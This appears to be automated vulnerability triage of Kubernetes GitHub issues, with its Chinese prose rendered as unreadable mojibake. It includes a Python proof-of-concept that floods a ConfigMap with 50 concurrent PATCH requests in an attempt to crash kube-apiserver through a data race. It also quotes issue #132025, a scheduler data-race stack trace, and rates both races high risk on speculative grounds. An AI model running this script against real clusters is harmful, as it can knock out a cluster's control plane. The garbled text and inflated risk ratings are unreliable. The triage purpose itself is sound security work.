2.  **æ•°æ®æŸå**ï¼šèµ„æºå¯¹è±¡åœ¨è¢«å†™å…¥etcdä¹‹å‰å¯èƒ½è¢«ä¸æ­£ç¡®åœ°ä¿®æ”¹ï¼Œå¯¼è‡´å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æœ€ç»ˆçŠ¶æ€ä¸é¢„æœŸä¸ç¬¦ï¼Œç ´åäº†æ•°æ®çš„ä¸€è‡´æ€§ã€‚
3.  **ä¿¡æ¯æ³„éœ²**ï¼šåœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¦‚æœç«äº‰çš„å†…å­˜åŒºåŸŸè¢«ä¸åŒè¯·æ±‚çš„goroutineå…±äº«ï¼Œä¸€ä¸ªè¯·æ±‚çš„æ•°æ®å¯èƒ½ä¼šæ„å¤–åœ°æ³„éœ²åˆ°å¦ä¸€ä¸ªè¯·æ±‚çš„å“åº”ä¸­ã€‚
4.  **ä¸æ­£ç¡®çš„é‰´æƒæˆ–éªŒè¯**ï¼šè™½ç„¶åœ¨æ­¤ç‰¹å®šåœºæ™¯ä¸‹å¯èƒ½æ€§è¾ƒä½ï¼Œä½†å¦‚æœç«äº‰çš„å˜é‡ç”¨äºæ§åˆ¶å®‰å…¨é€»è¾‘ï¼Œå¯èƒ½ä¼šå¯¼è‡´å®‰å…¨ç­–ç•¥è¢«ç»•è¿‡ã€‚

è¯¥æ¼æ´çš„æ ¸å¿ƒé£é™©åœ¨äºå…¶å¯¹APIæœåŠ¡å™¨å¯ç”¨æ€§çš„å½±å“ã€‚APIæœåŠ¡å™¨æ˜¯Kubernetesé›†ç¾¤çš„æ§åˆ¶å¹³é¢æ ¸å¿ƒï¼Œå…¶å´©æºƒå°†å¯¼è‡´æ•´ä¸ªé›†ç¾¤åœ¨é‡å¯æ¢å¤å‰æ— æ³•ç®¡ç†ï¼ŒåŒ…æ‹¬æ— æ³•è°ƒåº¦æ–°çš„Podã€æ— æ³•æ›´æ–°æˆ–åˆ é™¤èµ„æºç­‰ã€‚

æ”»å‡»è€…åªéœ€è¦æ‹¥æœ‰å¯¹é›†ç¾¤ä¸­ä»»æ„ä¸€ä¸ªèµ„æºçš„`PATCH`æƒé™ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ™®é€šç”¨æˆ·å¯¹è‡ªå·±å‘½åç©ºé—´ä¸‹çš„`ConfigMap`çš„`PATCH`æƒé™ï¼‰ï¼Œå°±å¯ä»¥é€šè¿‡å‘é€å¤§é‡å¹¶å‘çš„`PATCH`è¯·æ±‚æ¥å°è¯•è§¦å‘è¿™ä¸ªæ•°æ®ç«äº‰ã€‚ç”±äºä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯ä»¥å½±å“åˆ°æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§ï¼Œè¿™å¤§å¤§æå‡äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)**ï¼šæ”»å‡»è€…é€šè¿‡ç½‘ç»œå‘APIæœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚
*   **Attack Complexity (AC): High (H)**ï¼šè§¦å‘æ•°æ®ç«äº‰éœ€è¦ç²¾ç¡®çš„æ—¶æœºå’Œå¹¶å‘ï¼ŒæˆåŠŸåˆ©ç”¨å…·æœ‰éšæœºæ€§ã€‚
*   **Privileges Required (PR): Low (L)**ï¼šæ”»å‡»è€…éœ€è¦æœ‰æ•ˆçš„Kuberneteså‡­è¯ï¼Œå¹¶æ‹¥æœ‰å¯¹è‡³å°‘ä¸€ç§èµ„æºçš„`PATCH`æƒé™ï¼Œè¿™åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­æ˜¯å¸¸è§æƒé™ã€‚
*   **User Interaction (UI): None (N)**ï¼šæ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Changed (C)**ï¼šæ¼æ´å­˜åœ¨äºAPIæœåŠ¡å™¨ç»„ä»¶ä¸­ï¼Œä½†å…¶æˆåŠŸåˆ©ç”¨ï¼ˆå¯¼è‡´æœåŠ¡å´©æºƒï¼‰ä¼šå½±å“åˆ°æ•´ä¸ªé›†ç¾¤çš„æ§åˆ¶å¹³é¢ï¼Œè¶…å‡ºäº†APIæœåŠ¡å™¨æœ¬èº«çš„èŒƒå›´ã€‚
*   **Confidentiality (C): None (N)**ï¼šä¿¡æ¯æ³„éœ²çš„å¯èƒ½æ€§è¾ƒä½ä¸”éš¾ä»¥è¯å®ï¼Œä¸»è¦å½±å“æ˜¯å¯ç”¨æ€§ã€‚
*   **Integrity (I): Low (L)**ï¼šå¯èƒ½å¯¼è‡´è¢«PATCHçš„èµ„æºæ•°æ®æŸåã€‚
*   **Availability (A): High (H)**ï¼šæœ€ä¸»è¦çš„é£é™©æ˜¯APIæœåŠ¡å™¨å´©æºƒï¼Œå¯¼è‡´æ•´ä¸ªæ§åˆ¶å¹³é¢æ‹’ç»æœåŠ¡ã€‚

ç»¼åˆè¯„åˆ†ï¼šCVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:L/A:Hï¼Œå¾—åˆ†ä¸º**7.5**ï¼Œå±äºé«˜é£é™©ã€‚

å°½ç®¡åˆ©ç”¨éœ€è¦`PATCH`æƒé™ï¼Œä½†æ ¹æ®åˆ¤æ–­æ ‡å‡†ç¬¬8æ¡ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“åˆ°æ•´ä¸ªé›†ç¾¤ï¼ˆåŒ…æ‹¬é«˜æƒé™ç”¨æˆ·ï¼‰ï¼Œåº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import threading
import time
import uuid
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

from kubernetes import client, config
from kubernetes.client.rest import ApiException

# --- é…ç½® ---
# å¹¶å‘PATCHè¯·æ±‚çš„æ•°é‡ï¼Œå¢åŠ æ­¤å€¼å¯æé«˜è§¦å‘ç«äº‰æ¡ä»¶çš„æ¦‚ç‡
CONCURRENT_REQUESTS = 50
# æµ‹è¯•ä½¿ç”¨çš„å‘½åç©ºé—´
NAMESPACE = "default"
# ä¸ºé¿å…å†²çªï¼Œä½¿ç”¨å”¯ä¸€çš„ConfigMapåç§°
CONFIGMAP_NAME = f"race-test-cm-{uuid.uuid4().hex[:8]}"
# æµ‹è¯•æ‰§è¡Œçš„è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
TIMEOUT_SECONDS = 120

def patch_worker(api_instance, namespace, cm_name, thread_id):
    """
    æ¯ä¸ªçº¿ç¨‹æ‰§è¡Œæ­¤å‡½æ•°ï¼Œå¯¹ConfigMapè¿›è¡ŒPATCHæ“ä½œã€‚
    """
    # æ¯ä¸ªçº¿ç¨‹ä½¿ç”¨ä¸åŒçš„keyè¿›è¡Œpatchï¼Œä»¥æ¨¡æ‹ŸçœŸå®çš„å¹¶å‘å†™æ“ä½œ
    patch_body = {
        "data": {
            f"key-{thread_id}": f"value-{uuid.uuid4().hex}"
        }
    }
    try:
        # ä½¿ç”¨ strategic-merge-patch ç±»å‹çš„PATCH
        api_instance.patch_namespaced_config_map(
            name=cm_name,
            namespace=namespace,
            body=patch_body,
        )
        return f"çº¿ç¨‹ {thread_id}: æˆåŠŸPATCH ConfigMapã€‚"
    except ApiException as e:
        # åœ¨ç«äº‰æ¡ä»¶ä¸‹ï¼Œå¯èƒ½ä¼šé‡åˆ°409 Conflicté”™è¯¯ï¼Œè¿™æ˜¯æ­£å¸¸çš„ã€‚
        # å…¶ä»–é”™è¯¯åˆ™å¯èƒ½è¡¨ç¤ºå­˜åœ¨é—®é¢˜ã€‚
        if e.status == 409:
            return f"çº¿ç¨‹ {thread_id}: é­é‡é¢„æœŸçš„èµ„æºç‰ˆæœ¬å†²çª (409)ã€‚"
        return f"çº¿ç¨‹ {thread_id}: PATCH ConfigMapå¤±è´¥ã€‚çŠ¶æ€ç : {e.status}, åŸå› : {e.reason}"
    except Exception as e:
        return f"çº¿ç¨‹ {thread_id}: å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}"

def main():
    """
    ä¸»å‡½æ•°ï¼Œç”¨äºè®¾ç½®ç¯å¢ƒå¹¶æ‰§è¡Œæ•°æ®ç«äº‰æµ‹è¯•ã€‚
    """
    try:
        # ä»é»˜è®¤ä½ç½® (~/.kube/config) åŠ è½½Kubernetesé…ç½®
        config.load_kube_config()
        api = client.CoreV1Api()
        print("æˆåŠŸåŠ è½½Kubernetesé…ç½®ã€‚")
    except Exception as e:
        print(f"æ— æ³•åŠ è½½Kubernetesé…ç½®: {e}")
        print("è¯·ç¡®ä¿æ‚¨çš„ 'kubeconfig' æ–‡ä»¶å·²æ­£ç¡®é…ç½®ã€‚")
        return

    # 1. åˆ›å»ºç”¨äºæµ‹è¯•çš„ConfigMap
    cm_body = client.V1ConfigMap(
        api_version="v1",
        kind="ConfigMap",
        metadata=client.V1ObjectMeta(name=CONFIGMAP_NAME),
        data={"initial_key": "initial_value"}
    )

    try:
        print(f"åœ¨å‘½åç©ºé—´ '{NAMESPACE}' ä¸­åˆ›å»ºConfigMap '{CONFIGMAP_NAME}'...")
        api.create_namespaced_config_map(namespace=NAMESPACE, body=cm_body)
        print("ConfigMapåˆ›å»ºæˆåŠŸã€‚")
        # çŸ­æš‚ç­‰å¾…ï¼Œç¡®ä¿èµ„æºåœ¨é›†ç¾¤ä¸­å®Œå…¨å¯ç”¨
        time.sleep(2)

        # 2. å¹¶å‘æ‰§è¡ŒPATCHè¯·æ±‚ä»¥è§¦å‘æ•°æ®ç«äº‰
        print(f"\nå¼€å§‹å‘é€ {CONCURRENT_REQUESTS} ä¸ªå¹¶å‘PATCHè¯·æ±‚...")
        print("æœ¬è„šæœ¬çš„ç›®çš„æ˜¯åœ¨APIæœåŠ¡å™¨ä¸Šè§¦å‘æ•°æ®ç«äº‰ã€‚")
        print("è¯·åœ¨æ‰§è¡ŒæœŸé—´å’Œæ‰§è¡Œåï¼Œç›‘æ§APIæœåŠ¡å™¨çš„æ—¥å¿—ï¼ŒæŸ¥æ‰¾ç±»ä¼¼ 'WARNING: DATA RACE' çš„è‡´å‘½é”™è¯¯ä¿¡æ¯ã€‚")

        with ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
            # æäº¤æ‰€æœ‰PATCHä»»åŠ¡
            futures = [executor.submit(patch_worker, api, NAMESPACE, CONFIGMAP_NAME, i) for i in range(CONCURRENT_REQUESTS)]

            # ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆï¼Œå¹¶è®¾ç½®è¶…æ—¶
            for future in as_completed(futures, timeout=TIMEOUT_SECONDS):
                try:
                    result = future.result()
                    # print(result) # å¯é€‰ï¼šå–æ¶ˆæ³¨é‡Šä»¥æŸ¥çœ‹æ¯ä¸ªçº¿ç¨‹çš„è¾“å‡º
                except Exception as exc:
                    print(f"ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œæ—¶æŠ›å‡ºå¼‚å¸¸: {exc}")

        print(f"\nå¹¶å‘è¯·æ±‚åœ¨ {TIMEOUT_SECONDS} ç§’å†…æ‰§è¡Œå®Œæ¯•ã€‚")
        print("å¦‚æœç›®æ ‡APIæœåŠ¡å™¨å­˜åœ¨è¯¥æ¼æ´ï¼Œå®ƒå¯èƒ½å·²ç»å´©æºƒé‡å¯ã€‚")
        print("è¯·åŠ¡å¿…æ£€æŸ¥Kubernetesä¸»èŠ‚ç‚¹ä¸Šçš„kube-apiserverå®¹å™¨æ—¥å¿—ã€‚")

    except Exception as e:
        print(f"\næµ‹è¯•è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
    finally:
        # 3. æ¸…ç†æµ‹è¯•èµ„æº
        try:
            print(f"\næ­£åœ¨æ¸…ç†èµ„æºï¼šåˆ é™¤ConfigMap '{CONFIGMAP_NAME}'...")
            api.delete_namespaced_config_map(
                name=CONFIGMAP_NAME,
                namespace=NAMESPACE,
                body=client.V1DeleteOptions()
            )
            print("èµ„æºæ¸…ç†æˆåŠŸã€‚")
        except ApiException as e:
            if e.status == 404:
                print("ConfigMapæœªæ‰¾åˆ°ï¼Œå¯èƒ½å·²è¢«åˆ é™¤æˆ–ä»æœªæˆåŠŸåˆ›å»ºã€‚")
            else:
                print(f"æ¸…ç†ConfigMapæ—¶å‘ç”ŸAPIé”™è¯¯ï¼Œå¯èƒ½éœ€è¦æ‰‹åŠ¨åˆ é™¤ã€‚é”™è¯¯: {e.reason}")
        except Exception as e:
             print(f"æ¸…ç†è¿‡ç¨‹ä¸­å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬æ—¨åœ¨é€šè¿‡æ¨¡æ‹Ÿé«˜å¹¶å‘çš„`PATCH`è¯·æ±‚æ¥å¤ç°Kubernetes APIæœåŠ¡å™¨ä¸­çš„æ•°æ®ç«äº‰æ¼æ´ã€‚

1.  **ç¯å¢ƒå‡†å¤‡**: è„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonå®¢æˆ·ç«¯åº“ä»é»˜è®¤è·¯å¾„ï¼ˆ`~/.kube/config`ï¼‰åŠ è½½æœ¬åœ°çš„Kubernetesé›†ç¾¤è®¤è¯ä¿¡æ¯ã€‚å¦‚æœåŠ è½½å¤±è´¥ï¼Œç¨‹åºä¼šæç¤ºç”¨æˆ·æ£€æŸ¥é…ç½®ã€‚
2.  **èµ„æºåˆ›å»º**: ä¸ºäº†è¿›è¡Œæµ‹è¯•ä¸”ä¸å½±å“ç°æœ‰é›†ç¾¤èµ„æºï¼Œè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªå…·æœ‰å”¯ä¸€åç§°çš„`ConfigMap`ã€‚è¿™ä¸ª`ConfigMap`æ˜¯åç»­å¹¶å‘`PATCH`æ“ä½œçš„ç›®æ ‡ã€‚
3.  **å¹¶å‘æ”»å‡»**:
    *   è„šæœ¬ä½¿ç”¨`ThreadPoolExecutor`æ¥åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± ï¼Œæ± çš„å¤§å°è®¾ç½®ä¸º`CONCURRENT_REQUESTS`ï¼ˆé»˜è®¤ä¸º50ï¼‰ï¼Œä»¥ç¡®ä¿èƒ½å¤ŸåŒæ—¶å‘èµ·å¤§é‡è¯·æ±‚ã€‚
    *   `patch_worker`å‡½æ•°æ˜¯æ¯ä¸ªçº¿ç¨‹è¦æ‰§è¡Œçš„æ ¸å¿ƒä»»åŠ¡ã€‚å®ƒä¼šæ„é€ ä¸€ä¸ª`PATCH`è¯·æ±‚ä½“ï¼Œå°è¯•å‘æµ‹è¯•`ConfigMap`ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„é”®å€¼å¯¹ã€‚
    *   ä¸»é€»è¾‘ä¼šåŒæ—¶å¯åŠ¨æ‰€æœ‰çº¿ç¨‹ï¼Œè¿™äº›çº¿ç¨‹ä¼šå‡ ä¹åœ¨åŒä¸€æ—¶é—´å‘Kubernetes APIæœåŠ¡å™¨å‘é€`PATCH`è¯·æ±‚ï¼Œä»è€Œæå¤§åœ°å¢åŠ äº†åœ¨æœåŠ¡å™¨ç«¯å¤„ç†è¿™äº›è¯·æ±‚æ—¶å‘ç”Ÿæ•°æ®ç«äº‰çš„å¯èƒ½æ€§ã€‚
4.  **ç»“æœéªŒè¯**: æ•°æ®ç«äº‰æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨æœåŠ¡å™¨ç«¯çš„å†…éƒ¨é—®é¢˜ã€‚å®¢æˆ·ç«¯æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸè§¦å‘äº†æ¼æ´ã€‚å› æ­¤ï¼Œ**æ­¤è„šæœ¬çš„æˆåŠŸæ ‡å¿—ä¸æ˜¯å…¶è¾“å‡ºå†…å®¹ï¼Œè€Œæ˜¯åœ¨å…¶è¿è¡Œæ—¶æˆ–è¿è¡Œåï¼ŒAPIæœåŠ¡å™¨çš„æ—¥å¿—ä¸­å‡ºç°äº†`WARNING: DATA RACE`çš„ææ…Œï¼ˆpanicï¼‰æ—¥å¿—ï¼Œå¹¶å¯èƒ½ä¼´éšAPIæœåŠ¡å™¨çš„é‡å¯**ã€‚è„šæœ¬åœ¨è¾“å‡ºä¸­æ˜ç¡®æç¤ºç”¨æˆ·éœ€è¦æ£€æŸ¥æœåŠ¡å™¨æ—¥å¿—ã€‚
5.  **èµ„æºæ¸…ç†**: ä¸ºäº†ä¿æŒç¯å¢ƒæ•´æ´ï¼Œè„šæœ¬åœ¨`finally`å—ä¸­ç¡®ä¿æ— è®ºæµ‹è¯•æˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„`ConfigMap`ã€‚
6.  **è¶…æ—¶æœºåˆ¶**: è„šæœ¬é€šè¿‡`as_completed`å‡½æ•°çš„`timeout`å‚æ•°è®¾ç½®äº†120ç§’çš„è¶…æ—¶ï¼Œç¡®ä¿è„šæœ¬ä¸ä¼šæ°¸ä¹…è¿è¡Œï¼Œèƒ½åœ¨æŒ‡å®šæ—¶é—´å†…å®Œæˆæ‰§è¡Œå¹¶é€€å‡ºã€‚

è¦ä½¿ç”¨æ­¤è„šæœ¬ï¼Œç”¨æˆ·éœ€è¦ï¼š
*   å®‰è£…`kubernetes` Pythonåº“ (`pip install kubernetes`)ã€‚
*   é…ç½®å¥½æœ¬åœ°`kubeconfig`æ–‡ä»¶ï¼Œå¹¶æ‹¥æœ‰è¿æ¥åˆ°Kubernetesé›†ç¾¤ä»¥åŠåœ¨`default`å‘½åç©ºé—´ä¸­åˆ›å»ºã€ä¿®æ”¹å’Œåˆ é™¤`ConfigMap`çš„æƒé™ã€‚
*   åœ¨è¿è¡Œè„šæœ¬çš„åŒæ—¶ï¼Œé€šè¿‡`kubectl logs -f <kube-apiserver-pod-name> -n kube-system`ç­‰å‘½ä»¤æ¥ç›‘æ§APIæœåŠ¡å™¨çš„æ—¥å¿—ã€‚

---


## Issue #132025 scheduler handleSchedulingFailure: DATA RACE

- Issue é“¾æ¥ï¼š[#132025](https://github.com/kubernetes/kubernetes/issues/132025)

### Issue å†…å®¹

#### What happened?

I have https://github.com/kubernetes/kubernetes/pull/116980 which runs integration tests with race detection enabled. Running it shows in several tests:
```
k8s.io/kubernetes/test/integration/scheduler: preemption
...
=== RUN   TestPreemption/basic_pod_preemption_with_preFilter_(Async_preemption_enabled:_true)
...

WARNING: DATA RACE
Write at 0x00c0089f0c60 by goroutine 6125:
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure()
      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:1068 +0x1154
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure-fm()
      <autogenerated>:1 +0xcb
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne()
      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:118 +0xd8a
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne-fm()
      <autogenerated>:1 +0x47
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x9c
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed
  k8s.io/apimachinery/pkg/util/wait.JitterUntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:223 +0x108
  k8s.io/apimachinery/pkg/util/wait.UntilWithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x59
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:507 +0x17

Previous read at 0x00c0089f0c60 by goroutine 5910:
  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).Update()
      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1020 +0x1652
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).updatePodInSchedulingQueue()
      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/eventhandlers.go:164 +0xd06
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).updatePodInSchedulingQueue-fm()
      <autogenerated>:1 +0x64
  k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/controller.go:264 +0x81
  k8s.io/client-go/tools/cache.(*ResourceEventHandlerFuncs).OnUpdate()
      <autogenerated>:1 +0x1f
  k8s.io/client-go/tools/cache.FilteringResourceEventHandler.OnUpdate()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/controller.go:329 +0xef
  k8s.io/client-go/tools/cache.(*FilteringResourceEventHandler).OnUpdate()
      <autogenerated>:1 +0x84
  k8s.io/client-go/tools/cache.(*processorListener).run.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1074 +0x3b9
  k8s.io/client-go/tools/cache.(*processorListener).run()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1086 +0x5e
  k8s.io/client-go/tools/cache.(*processorListener).run-fm()
      <autogenerated>:1 +0x33
  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86

Goroutine 6125 (running) created at:
  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run()
      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:507 +0x1c4
  k8s.io/kubernetes/test/integration/scheduler/preemption.TestPreemption.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/scheduler/preemption/preemption_test.go:179 +0x4f

Goroutine 5910 (running) created at:
  k8s.io/apimachinery/pkg/util/wait.(*Group).Start()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0xe4
  k8s.io/client-go/tools/cache.(*sharedProcessor).run.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:888 +0x1e7
  k8s.io/client-go/tools/cache.(*sharedProcessor).run()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:892 +0x4b
  k8s.io/client-go/tools/cache.(*sharedProcessor).run-fm()
      <autogenerated>:1 +0x47
  k8s.io/client-go/tools/cache.(*sharedIndexInformer).RunWithContext.(*Group).StartWithContext.func4()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:63 +0x46
  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86
```

#### What did you expect to happen?

No data race.

#### How can we reproduce it (as minimally and precisely as possible)?

Run locally with `go test -race`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

master

/sig scheduling


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨Kubernetesè°ƒåº¦å™¨ï¼ˆkube-schedulerï¼‰ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ•°æ®ç«äº‰ï¼ˆData Raceï¼‰é—®é¢˜ã€‚è¯¥é—®é¢˜åœ¨å¼€å¯äº†ç«äº‰æ£€æµ‹çš„é›†æˆæµ‹è¯•ä¸­è¢«å‘ç°ã€‚

æ ¹æ®æä¾›çš„å †æ ˆä¿¡æ¯ï¼Œé—®é¢˜å‘ç”Ÿåœ¨ä»¥ä¸‹ä¸¤ä¸ªå¹¶å‘æ“ä½œä¸­ï¼š
1.  **å†™æ“ä½œ**: Goroutine 6125 åœ¨ `k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure()` å‡½æ•°ä¸­å¯¹æŸä¸ªå†…å­˜åœ°å€è¿›è¡Œå†™æ“ä½œã€‚è¿™ä¸ªå‡½æ•°æ˜¯è°ƒåº¦å™¨åœ¨å°è¯•ä¸ºä¸€ä¸ªPodè°ƒåº¦ä½†å¤±è´¥åè°ƒç”¨çš„ï¼Œå±äºæ ¸å¿ƒè°ƒåº¦å¾ªç¯çš„ä¸€éƒ¨åˆ†ã€‚
2.  **è¯»æ“ä½œ**: Goroutine 5910 åœ¨ `k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).Update()` å‡½æ•°ä¸­å¯¹åŒä¸€å†…å­˜åœ°å€è¿›è¡Œè¯»æ“ä½œã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”±Informerçš„äº‹ä»¶å¤„ç†å™¨ï¼ˆ`OnUpdate`ï¼‰è§¦å‘çš„ï¼Œå½“ä¸€ä¸ªPodå¯¹è±¡åœ¨etcdä¸­è¢«æ›´æ–°æ—¶ï¼ŒInformerä¼šé€šçŸ¥è°ƒåº¦å™¨ï¼Œè°ƒåº¦å™¨éšä¹‹æ›´æ–°å…¶å†…éƒ¨è°ƒåº¦é˜Ÿåˆ—ä¸­çš„Podä¿¡æ¯ã€‚

